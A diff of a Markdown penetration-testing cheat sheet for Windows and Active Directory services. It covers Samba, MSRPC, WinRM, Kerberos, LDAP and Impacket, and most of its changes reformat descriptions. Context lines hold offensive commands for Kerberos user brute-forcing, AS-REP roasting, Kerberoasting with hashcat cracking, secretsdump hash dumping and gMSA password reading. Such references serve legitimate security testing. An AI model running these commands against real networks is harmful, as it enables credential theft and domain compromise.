@@ -32,7 +32,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS
 -->
 
 # Enum4Linux
-Enum4linux is a tool for enumerating information from Windows and Samba systems.
+> Enum4linux is a tool for enumerating information from Windows and Samba systems.
 
 ### List Users
 ```bash
@@ -50,7 +50,9 @@ enum4linux -a -u user -p password ip
 ```
 
 # Samba
-*Port: 445*
+> *Port: 445*
+>
+> Samba is a popular freeware program that allows users to access and use files, printers, and other commonly shared resources.
 
 ### Nmap
 ```bash
@@ -85,9 +87,9 @@ crackmapexec smb ip -u users.txt -p password.txt
 ```
 
 # MSRPC
-*Port: 135*
-
-"MSRPC is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network." · [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
+> *Port: 135*
+> 
+> "MSRPC is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network." · [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
 
 ### Connect
 ```bash
@@ -108,7 +110,7 @@ services.py user:password@987@ip list
 rpcdump.py user:password@987@ip
 ```
 
-[IOXIDResolver](https://raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py) is used for remote enumeration of network interfaces
+> [IOXIDResolver](https://raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py) is used for remote enumeration of network interfaces
 ```
 python IOXIDResolver.py -t IP
 ```
@@ -116,7 +118,9 @@ python IOXIDResolver.py -t IP
 [*Impacket Docs*](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
 
 # WinRM
-*Port: 5985 / 5986*
+> *Port: 5985 / 5986*
+> 
+> Windows Remote Management (WinRM) is a feature that allows administrators to remotely run management scripts, execute command, monitor and manage windows system remote computers and servers. 
 
 ### Connect with powershell
 ```bash
@@ -125,9 +129,9 @@ evil-winrm -i ip -c certi.crt -k decrypted.key -p -u -S
 ```
 
 # Kerberos
-*Port: 88*
-
-Kerberos is an authentication protocol that is used to verify the identity of a user or host.
+> *Port: 88*
+> 
+> Kerberos is an authentication protocol that is used to verify the identity of a user or host.
 
 ### Bruteforce User
 ```bash
@@ -135,14 +139,14 @@ kerbrute userenum -d domain --dc ip user.txt
 ```
 
 ### Get user ticket
-Checking if Kerberos pre-authentication has been disabled for accounts
+> Checking if Kerberos pre-authentication has been disabled for accounts
 ```
 GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip DOMAIN/
 ```
 
 ### Enumusers
+> With msfconsole we have able to list users form wordlists of users.
 
-With msfconsole we have able to list users form wordlists of users.
 ```
 msf6 auxiliary(gather/kerberos_enumusers)
 ```
@@ -150,9 +154,9 @@ msf6 auxiliary(gather/kerberos_enumusers)
 - [Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
 
 # Ldap
-*Port: 389, 636*
-
-Lightweight directory access protocol (LDAP) is a protocol that makes it possible for applications to query user information rapidly.
+> *Port: 389, 636*
+> 
+> Lightweight directory access protocol (LDAP) is a protocol that makes it possible for applications to query user information rapidly.
 
 ### Nmap
 ```bash
@@ -160,32 +164,27 @@ nmap -n -sV --script "ldap* and not brute" -p 389 ip
 ```
 
 ### Ldapsearch
-
 ```
 ldapsearch -x -h IP -b DC=EXAMPLE,DC=COM
 ```
 
 ### Ldapdomaindump
-
-
-[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) is a tool for gathering information of ldap. (you need to have creds of an user to use it)
+> [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) is a tool for gathering information of ldap. (you need to have creds of an user to use it)
 
 ```
 ldapdomaindump IP -u 'DOMAIN\USER' -p PASSWORD --no-json --no-grep
 ```
 
 ### gMSADumper
-
-[gMSADumper](https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py) read the gMSA (group managed service accounts) password of the account.
+> [gMSADumper](https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py) read the gMSA (group managed service accounts) password of the account.
 
 ```
 python gMSADumper.py -u USER -p PASSWORD -d DOMAIN
 ```
 
 # IMPACKET
-
 ### GetUserSPNs
-[GetUserSPNs](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) find Service Principal Names that are associated with normal user account, and exfiltrate the kerberos.
+> [GetUserSPNs](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) find Service Principal Names that are associated with normal user account, and exfiltrate the kerberos.
 
 ```
 python GetUserSPNs.py -dc-ip IP -outputfile KERBEROS_FILE_OUTPUT -request -debug <DOMAIN>/<USER>
@@ -194,22 +193,19 @@ hashcat -m 13100 --force -a 0 KERBEROS_FILE /usr/share/wordlists/rockyou.txt
 ```
 
 ### GetNPUsers
-
-[GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/GetNPUsers.py) will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set.
+> [GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/GetNPUsers.py) will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set.
 
 ```
 python GetNPUsers.py -usersfile USER_LIST_FILE -no-pass -dc-ip IP DOMAIN/
 ```
 
 ### secretsdump
-
-[secretsdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/secretsdump.py) dumping Active Directory Password Hashes.
+> [secretsdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/secretsdump.py) dumping Active Directory Password Hashes.
 
 ```
 python secretsdump.py -just-dc-ntlm DOMAIN/USER@DOMAIN_CONTROLLER
 python secretsdump.py DOMAIN/USER:PASSWORD@IP
 ```
-
 
 # Exfiltration
 ### Certificate
